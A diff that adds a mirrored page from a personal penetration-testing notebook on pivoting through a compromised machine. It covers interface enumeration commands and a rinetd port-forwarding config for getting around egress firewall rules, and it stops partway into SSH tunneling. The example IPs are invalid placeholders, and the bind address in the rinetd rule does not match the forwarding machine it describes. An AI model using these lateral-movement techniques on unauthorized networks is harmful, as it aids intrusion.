@@ -1,0 +1,1977 @@
+
+<!DOCTYPE HTML>
+<html lang="en" >
+    
+<!-- Mirrored from xapax.gitbooks.io/security/content/port_forwarding_and_tunneling.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 26 Sep 2018 18:14:05 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>Pivoting - Port forwarding - Tunneling · Security - My notepad</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        <meta name="author" content="Philip Linghammar">
+        
+        
+    
+    <link rel="stylesheet" href="gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-comment/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+        <link rel="stylesheet" href="styles/website.css">
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="network_traffic.html" />
+    
+    
+    <link rel="prev" href="pass_the_hash_-_reusing_hashes.html" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+    
+        
+        <li>
+            <a href="https://legacy.gitbook.com/book/xapax/security" target="_blank" class="custom-link">Security - My notepad</a>
+        </li>
+    
+    
+
+    
+    <li class="divider"></li>
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="./">
+            
+                <a href="index.html">
+            
+                    
+                    Introduction
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="the_basics.html">
+            
+                <a href="the_basics.html">
+            
+                    
+                    The Basics
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1" data-path="linux.html">
+            
+                <a href="linux.html">
+            
+                    
+                    Linux
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1.1" data-path="basics_of_linux.html">
+            
+                <a href="basics_of_linux.html">
+            
+                    
+                    Basics of Linux
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.2" data-path="bash-scripting.html">
+            
+                <a href="bash-scripting.html">
+            
+                    
+                    Bash-scripting
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.3" data-path="vim.html">
+            
+                <a href="vim.html">
+            
+                    
+                    Vim
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2" data-path="windows.html">
+            
+                <a href="windows.html">
+            
+                    
+                    Windows
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.1" data-path="basics_of_windows.html">
+            
+                <a href="basics_of_windows.html">
+            
+                    
+                    Basics of Windows
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.2" data-path="powershell.html">
+            
+                <a href="powershell.html">
+            
+                    
+                    PowerShell
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.3" data-path="powershell_scripting2.html">
+            
+                <a href="powershell_scripting2.html">
+            
+                    
+                    PowerShell Scripting
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.4" data-path="cmd.html">
+            
+                <a href="cmd.html">
+            
+                    
+                    CMD
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3" data-path="scripting_with_python.html">
+            
+                <a href="scripting_with_python.html">
+            
+                    
+                    Scripting With Python
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.3.1" data-path="python_fundamentals.html">
+            
+                <a href="python_fundamentals.html">
+            
+                    
+                    Python Fundamentals
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3.2" data-path="connections.html">
+            
+                <a href="connections.html">
+            
+                    
+                    Useful Scripts
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4" data-path="transfering_files2.html">
+            
+                <a href="transfering_files2.html">
+            
+                    
+                    Transferring Files
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.4.1" data-path="transfering_files.html">
+            
+                <a href="transfering_files.html">
+            
+                    
+                    Transfering Files on Linux
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.2" data-path="transfering_files_to_windows.html">
+            
+                <a href="transfering_files_to_windows.html">
+            
+                    
+                    Transfering files on Windows
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5" data-path="firewalls.html">
+            
+                <a href="firewalls.html">
+            
+                    
+                    Firewalls
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6" data-path="general_tips.html">
+            
+                <a href="general_tips.html">
+            
+                    
+                    General tips and tricks
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.7" >
+            
+                <span>
+            
+                    
+                    Cryptography
+            
+                </span>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" data-path="scanning.html">
+            
+                <a href="scanning.html">
+            
+                    
+                    Recon and Information Gathering Phase
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1" data-path="passive_information_gatherig.html">
+            
+                <a href="passive_information_gatherig.html">
+            
+                    
+                    Passive Information Gatherig
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1.1" >
+            
+                <span>
+            
+                    
+                    Identify IP-addresses and Subdomains
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1.1.1" >
+            
+                <span>
+            
+                    
+                    Identify IP-addresses
+            
+                </span>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.1.2" data-path="find_subdomains.html">
+            
+                <a href="find_subdomains.html">
+            
+                    
+                    Find Subdomains
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1.1.2.1" data-path="dns_basics.html">
+            
+                <a href="dns_basics.html">
+            
+                    
+                    DNS Basics
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.1.2.2" data-path="finding_subdomains.html">
+            
+                <a href="finding_subdomains.html">
+            
+                    
+                    Finding subdomains
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.1.2.3" data-path="dns_zone_transfer_attack.html">
+            
+                <a href="dns_zone_transfer_attack.html">
+            
+                    
+                    DNS Zone Transfer Attack
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.2" data-path="email_harvesting.html">
+            
+                <a href="email_harvesting.html">
+            
+                    
+                    Identifying People
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.3" data-path="google_hacking.html">
+            
+                <a href="google_hacking.html">
+            
+                    
+                    Search Engine Discovery
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.4" data-path="identifying-technology-stack.html">
+            
+                <a href="identifying-technology-stack.html">
+            
+                    
+                    Identifying Technology Stack
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2" data-path="active_information_gathering.html">
+            
+                <a href="active_information_gathering.html">
+            
+                    
+                    Active Information Gathering
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.2.1" data-path="port_scanning.html">
+            
+                <a href="port_scanning.html">
+            
+                    
+                    Port Scanning
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" data-path="vulnerability_analysi1s.html">
+            
+                <a href="vulnerability_analysi1s.html">
+            
+                    
+                    Vulnerability analysis
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.1" data-path="server-side-vulnerabilities.html">
+            
+                <a href="server-side-vulnerabilities.html">
+            
+                    
+                    Non-HTTP Vulnerabilities
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.1.1" data-path="list_of_common_ports.html">
+            
+                <a href="list_of_common_ports.html">
+            
+                    
+                    Common ports\/services and how to use them
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.1.2" data-path="port_knocking.html">
+            
+                <a href="port_knocking.html">
+            
+                    
+                    Port Knocking
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2" data-path="web-services.html">
+            
+                <a href="web-services.html">
+            
+                    
+                    HTTP - Web Vulnerabilities
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.2.1" data-path="common_web-services.html">
+            
+                <a href="common_web-services.html">
+            
+                    
+                    Common Web-services
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.2" >
+            
+                <span>
+            
+                    
+                    Authentication
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.2.2.1" >
+            
+                <span>
+            
+                    
+                    OAuth
+            
+                </span>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.3" data-path="session-management.html">
+            
+                <a href="session-management.html">
+            
+                    
+                    Session Management
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.2.3.1" >
+            
+                <span>
+            
+                    
+                    Ses
+            
+                </span>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.4" data-path="broken_authentication_or_session_management.html">
+            
+                <a href="broken_authentication_or_session_management.html">
+            
+                    
+                    Broken Authentication or Session Management
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.5" data-path="session-fixation.html">
+            
+                <a href="session-fixation.html">
+            
+                    
+                    Session Fixation
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.6" data-path="waf_-_web_application_firewall.html">
+            
+                <a href="waf_-_web_application_firewall.html">
+            
+                    
+                    WAF - Web Application Firewall
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.7" data-path="lead_to_compromise.html">
+            
+                <a href="lead_to_compromise.html">
+            
+                    
+                    Attacking the System
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.2.7.1" data-path="local_file_inclusion.html">
+            
+                <a href="local_file_inclusion.html">
+            
+                    
+                    Local File Inclusion
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.7.2" data-path="remote_file_inclusion.html">
+            
+                <a href="remote_file_inclusion.html">
+            
+                    
+                    Remote File Inclusion
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.7.3" data-path="directory-traversal-attack.html">
+            
+                <a href="directory-traversal-attack.html">
+            
+                    
+                    Directory Traversal Attack
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.7.4" data-path="web-scanning.html">
+            
+                <a href="web-scanning.html">
+            
+                    
+                    Hidden Files and Directories
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.7.5" data-path="sql-injections.html">
+            
+                <a href="sql-injections.html">
+            
+                    
+                    SQL-Injections
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.7.6" data-path="nosql-injections.html">
+            
+                <a href="nosql-injections.html">
+            
+                    
+                    Nosql-Injections
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.7.7" data-path="xml_external_entity_attack.html">
+            
+                <a href="xml_external_entity_attack.html">
+            
+                    
+                    XML External Entity Attack
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.7.8" data-path="bypass_image_upload.html">
+            
+                <a href="bypass_image_upload.html">
+            
+                    
+                    Bypass File Upload Filtering
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.7.9" data-path="exposed_version_control.html">
+            
+                <a href="exposed_version_control.html">
+            
+                    
+                    Exposed Version Control
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.7.10" >
+            
+                <span>
+            
+                    
+                    Directory Traversal Attack
+            
+                </span>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.7.11" data-path="host-header-attack.html">
+            
+                <a href="host-header-attack.html">
+            
+                    
+                    Host Header Attack
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.7.12" data-path="deserialization-attacks.html">
+            
+                <a href="deserialization-attacks.html">
+            
+                    
+                    Deserialization attacks
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3" data-path="attacking_the_user.html">
+            
+                <a href="attacking_the_user.html">
+            
+                    
+                    Attacking the User
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.3.1" data-path="clickjacking.html">
+            
+                <a href="clickjacking.html">
+            
+                    
+                    Clickjacking
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3.2" data-path="text-injection.html">
+            
+                <a href="text-injection.html">
+            
+                    
+                    Text/content-injection
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3.3" data-path="html-injection.html">
+            
+                <a href="html-injection.html">
+            
+                    
+                    HTML-Injection
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3.4" data-path="insecure-direct-object-reference-idor.html">
+            
+                <a href="insecure-direct-object-reference-idor.html">
+            
+                    
+                    Insecure Direct Object Reference (IDOR)
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3.5" data-path="subdomain_takeover.html">
+            
+                <a href="subdomain_takeover.html">
+            
+                    
+                    Subdomain Takeover
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3.6" data-path="cross_site_request_forgery.html">
+            
+                <a href="cross_site_request_forgery.html">
+            
+                    
+                    Cross Site Request Forgery
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3.7" data-path="cross-site-scripting.html">
+            
+                <a href="cross-site-scripting.html">
+            
+                    
+                    Cross-Site Scripting
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.3.7.1" data-path="examplesXSS.html">
+            
+                <a href="examplesXSS.html">
+            
+                    
+                    Examples
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3.7.2" data-path="dom-based-xss.html">
+            
+                <a href="dom-based-xss.html">
+            
+                    
+                    DOM-based XSS
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3.8" data-path="browser_vulnerabilities.html">
+            
+                <a href="browser_vulnerabilities.html">
+            
+                    
+                    Browser Vulnerabilities
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3.9" >
+            
+                <span>
+            
+                    
+                    HTML-Injection
+            
+                </span>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.4" data-path="automated_vulnerability_scanners.html">
+            
+                <a href="automated_vulnerability_scanners.html">
+            
+                    
+                    Automated Vulnerability Scanners
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5" data-path="exploiting.html">
+            
+                <a href="exploiting.html">
+            
+                    
+                    Exploiting
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.5.1" data-path="social_engineering_-_phishing.html">
+            
+                <a href="social_engineering_-_phishing.html">
+            
+                    
+                    Social Engineering - Phishing
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.2" data-path="default_layout_apache_on_different_versiont.html">
+            
+                <a href="default_layout_apache_on_different_versiont.html">
+            
+                    
+                    Default Layout of Apache on Different Versions
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.3" data-path="reverse-shell.html">
+            
+                <a href="reverse-shell.html">
+            
+                    
+                    Shells
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.4" data-path="webshell.html">
+            
+                <a href="webshell.html">
+            
+                    
+                    Webshell
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.5" data-path="create_shellcode.html">
+            
+                <a href="create_shellcode.html">
+            
+                    
+                    Generate Shellcode
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.6" data-path="editing-exploits.html">
+            
+                <a href="editing-exploits.html">
+            
+                    
+                    Editing Exploits
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.7" data-path="compiling-windows-exploits.html">
+            
+                <a href="compiling-windows-exploits.html">
+            
+                    
+                    Compiling windows exploits
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6" data-path="post_exploitation.html">
+            
+                <a href="post_exploitation.html">
+            
+                    
+                    Post Exploitation
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.6.1" data-path="spawning_shells.html">
+            
+                <a href="spawning_shells.html">
+            
+                    
+                    Spawning Shells
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.2" data-path="getting_meterpreter_shell.html">
+            
+                <a href="getting_meterpreter_shell.html">
+            
+                    
+                    Meterpreter for Post-Exploitation
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.3" data-path="privilege_escalation_-_linux.html">
+            
+                <a href="privilege_escalation_-_linux.html">
+            
+                    
+                    Privilege Escalation - Linux
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.4" data-path="privilege_escalation_windows.html">
+            
+                <a href="privilege_escalation_windows.html">
+            
+                    
+                    Privilege Escalation - Windows
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.5" data-path="privilege-escalation-powershell.html">
+            
+                <a href="privilege-escalation-powershell.html">
+            
+                    
+                    Privilege Escalation - Powershell
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.6" data-path="escaping_restricted_shell.html">
+            
+                <a href="escaping_restricted_shell.html">
+            
+                    
+                    Escaping Restricted Shell
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.7" data-path="bypassing_antivirus.html">
+            
+                <a href="bypassing_antivirus.html">
+            
+                    
+                    Bypassing antivirus
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.8" data-path="loot.html">
+            
+                <a href="loot.html">
+            
+                    
+                    Loot and Enumerate
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.6.8.1" data-path="loot_windows_-_for_credentials_and_other_stuff.html">
+            
+                <a href="loot_windows_-_for_credentials_and_other_stuff.html">
+            
+                    
+                    Loot Windows
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.8.2" data-path="tcp-dumps_on_pwnd_machines.html">
+            
+                <a href="tcp-dumps_on_pwnd_machines.html">
+            
+                    
+                    Loot Linux
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.9" data-path="persistence.html">
+            
+                <a href="persistence.html">
+            
+                    
+                    Persistence
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.10" data-path="clean_up.html">
+            
+                <a href="clean_up.html">
+            
+                    
+                    Cover your tracks
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7" data-path="password-cracking.html">
+            
+                <a href="password-cracking.html">
+            
+                    
+                    Password Cracking
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.7.1" data-path="generate_custom_wordlist.html">
+            
+                <a href="generate_custom_wordlist.html">
+            
+                    
+                    Generate Custom Wordlist
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.2" data-path="identify_hash_and_crack_it.html">
+            
+                <a href="identify_hash_and_crack_it.html">
+            
+                    
+                    Offline Password Cracking
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.3" data-path="online_password_cracking.html">
+            
+                <a href="online_password_cracking.html">
+            
+                    
+                    Online Password Cracking
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.4" data-path="pass_the_hash_-_reusing_hashes.html">
+            
+                <a href="pass_the_hash_-_reusing_hashes.html">
+            
+                    
+                    Pass the Hash - Reusing Hashes
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter active" data-level="1.8" data-path="port_forwarding_and_tunneling.html">
+            
+                <a href="port_forwarding_and_tunneling.html">
+            
+                    
+                    Pivoting - Port forwarding - Tunneling
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9" data-path="network_traffic.html">
+            
+                <a href="network_traffic.html">
+            
+                    
+                    Network traffic analysis
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.9.1" data-path="arp-spoofing.html">
+            
+                <a href="arp-spoofing.html">
+            
+                    
+                    Arp-spoofing
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.9.1.1" data-path="ssl-strip.html">
+            
+                <a href="ssl-strip.html">
+            
+                    
+                    SSL-strip
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9.2" data-path="dns-spoofing.html">
+            
+                <a href="dns-spoofing.html">
+            
+                    
+                    DNS-spoofing
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9.3" data-path="wireshark.html">
+            
+                <a href="wireshark.html">
+            
+                    
+                    Wireshark
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.10" data-path="wifi.html">
+            
+                <a href="wifi.html">
+            
+                    
+                    Wifi
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.10.1" data-path="wep.html">
+            
+                <a href="wep.html">
+            
+                    
+                    WEP
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.10.2" data-path="wps.html">
+            
+                <a href="wps.html">
+            
+                    
+                    WPS
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.11" data-path="physical_access_to_machine.html">
+            
+                <a href="physical_access_to_machine.html">
+            
+                    
+                    Physical access to machine
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.12" data-path="littearature.html">
+            
+                <a href="littearature.html">
+            
+                    
+                    Literature
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com/" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="index.html" >Pivoting - Port forwarding - Tunneling</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h1 id="pivoting">Pivoting</h1>
+<p>Let&apos;s say that you have compromised one machine on a network and you want to keep going to another machine. You will use the first machine as a staging point/plant/foothold to break into machine 2. The technique of using one compromised machine to access another is called pivoting. Machine one is the <code>pivot</code> in the example. The <code>pivot</code> is just used as a way to channel/tunnel our attack. </p>
+<h2 id="ipconfig">Ipconfig</h2>
+<p>We are looking for machines that have at least THREE network interfaces (loopback, eth0, and eth1 (or something)). These machines are connected to other networks, so we can use them to pivot.</p>
+<pre><code># Windows
+ipconfig /all
+route print
+
+#Linux
+ifconfig
+ifconfig -a
+</code></pre><h1 id="port-forwarding-and-tunneling">Port forwarding and tunneling</h1>
+<h2 id="port-forwarding">Port forwarding</h2>
+<p>So imagine that you are on a network and you want to connect to a ftp server (or any other port) to upload or download some files. But someone has put some crazy firewall rules (egress filters) that prohibits outgoing traffics on all ports except for port 80. So how are we going to be able to connect to our ftp-server?</p>
+<p>What we can do is add a machine that redirect/forward all traffic that it receives on port 80 to port 21 on a different machine.</p>
+<p>So instead of having this kind of traffic </p>
+<pre><code>home-computer/port-21 ----&gt; ftp-server/port-21
+</code></pre><p>we will have</p>
+<pre><code>home-computer/port-80 ----&gt; port-80/proxy-machine/port-21 ----&gt; ftp-server
+</code></pre><p>And the other way around of course, to receive the traffic.</p>
+<p>Okay, so how do we go about actually implementing this?</p>
+<h3 id="rinetd---port-forwardredirect">Rinetd - Port forward/redirect</h3>
+<p>So we can set up this port forwarding machine with the help of rinetd.</p>
+<p>To make it clear, we have the following machines:
+Machine1 - IP: 111.111.111.111 - Behind firewall, and wants to connect to Machine3.
+Machine2 - IP: 222.222.222.222 - Forwards incomming connections to Machine3 
+Machine3 - IP: 333.333.333.333 - Hosts the ftp-server that machine1 wants to connect to.</p>
+<pre><code>apt-get install rinetd
+</code></pre><p>This is the default config file <code>/etc/rinetd.conf</code>: </p>
+<pre><code class="lang-bash"><span class="hljs-comment">#</span>
+<span class="hljs-comment"># this is the configuration file for rinetd, the internet redirection server</span>
+<span class="hljs-comment">#</span>
+<span class="hljs-comment"># you may specify global allow and deny rules here</span>
+<span class="hljs-comment"># only ip addresses are matched, hostnames cannot be specified here</span>
+<span class="hljs-comment"># the wildcards you may use are * and ?</span>
+<span class="hljs-comment">#</span>
+<span class="hljs-comment"># allow 192.168.2.*</span>
+<span class="hljs-comment"># deny 192.168.2.1?</span>
+
+
+<span class="hljs-comment">#</span>
+<span class="hljs-comment"># forwarding rules come here</span>
+<span class="hljs-comment">#</span>
+<span class="hljs-comment"># you may specify allow and deny rules after a specific forwarding rule</span>
+<span class="hljs-comment"># to apply to only that forwarding rule</span>
+<span class="hljs-comment">#</span>
+<span class="hljs-comment"># bindadress    bindport  connectaddress  connectport</span>
+
+
+<span class="hljs-comment"># logging information</span>
+logfile /var/<span class="hljs-built_in">log</span>/rinetd.log
+
+<span class="hljs-comment"># uncomment the following line if you want web-server style logfile format</span>
+<span class="hljs-comment"># logcommon</span>
+</code></pre>
+<p>This is the essential part of the configuration file, this is where we create the port-forwarding</p>
+<pre><code># bindadress    bindport  connectaddress  connectport
+111.111.111.111    80     333.333.333.333       21
+</code></pre><pre><code>/etc/init.d/rinetd restart
+</code></pre><p>So the bind-address is where the proxy receieves the connection, and the connectaddress is the machine it forwards the connection to.</p>
+<h2 id="ssh-tunneling---port-forwarding-on-ssh">SSH Tunneling - Port forwarding on SSH</h2>
+<p><strong>Use cases</strong></p>
+<ul>
+<li>You want to encrypt traffic that uses unencrypted protocols. Like VNC, IMAP, IRC.</li>
+<li>You are on a public network and want to encrypt all your http traffic.</li>
